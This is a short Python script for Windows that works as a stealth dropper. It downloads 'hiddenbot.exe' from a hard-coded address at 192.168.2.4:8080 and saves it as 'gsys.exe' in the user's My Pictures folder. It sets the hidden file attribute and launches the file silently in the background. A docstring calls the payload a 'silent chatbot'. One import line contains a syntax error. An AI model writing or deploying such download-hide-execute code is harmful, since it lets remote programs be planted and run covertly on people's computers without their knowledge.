import os
import urllib2
import win32api
import win32con

from win32com.shell import shellcon
from win32com.shell.shell import import SHGetFolderPath

global chatboturl
CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"

def download_install_run(url, specialpath, fname, duplicate=True):
    #Get a path for the file
    path = file_in_special_path(specialpath, fname)
    #If we're not meant to duplicate, return if the file's there
    if duplicate is False and os.path.isfile(path) is True:
        return
    #Unhide the file
    unhide_file(path)
    #Save and hide the file
    u = urllib2.urlopen(url)
    f = open(path, "wb")
    f.write(u.read())
    f.close()
    u.close()
    hide_file(path)
    
    #Make a command to run the file
    command = "start /b %s"%win32api.GetShortPathName(path)
    os.system(command)
    
        
#Utility functions.  May be useful elsewhere
def file_in_special_path(specialpath, fname):
    """Make a path composed of a special (CSIDL) path and a file name.
    
    @param specialpath: The CSIDL path found in shellcon
    @param fname: the name of the file
    """
    from win32com.shell import shell
    path = SHGetFolderPath(0, specialpath, None, 0)
    path = os.path.join(path, fname)
    return path

def hide_file(path):
    """Hide a file.
    
    First tries to open it (to make it exist), then tries to hide it.
    @param path: The path of the file to hide
    """
    __file_setstate(path, win32con.FILE_ATTRIBUTE_HIDDEN)
    
def unhide_file(path):
    """Unhide a file.
    
    First tries to open it (to make it exist), then tries to unhide it.
    @param path: The path of the file to hide
    """
    __file_setstate(path, win32con.FILE_ATTRIBUTE_NORMAL)
        
def __file_setstate(path, state):
    try:
        f = open(path, "r+")
        f.close()
    except:
        pass
    try:
        win32api.SetFileAttributes(path,state)
    except:
        pass
    

def main():
    """Download the silent chatbot and run it."""
    download_install_run(CHATBOTURL, shellcon.CSIDL_MYPICTURES, "gsys.exe")
    
if __name__ == "__main__":
    main()
